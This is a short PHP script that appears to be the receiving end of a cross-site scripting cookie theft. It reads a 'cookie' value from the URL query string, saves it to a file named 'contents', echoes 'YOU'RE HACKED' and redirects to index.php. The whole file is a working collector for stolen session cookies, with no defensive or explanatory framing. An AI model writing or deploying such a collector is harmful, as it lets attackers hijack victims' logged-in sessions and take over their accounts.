<?php
ob_start();
echo

"YOU'RE HACKED";

$cookie = $_GET['cookie'];

file_put_contents('contents',$cookie);

header('location:index.php');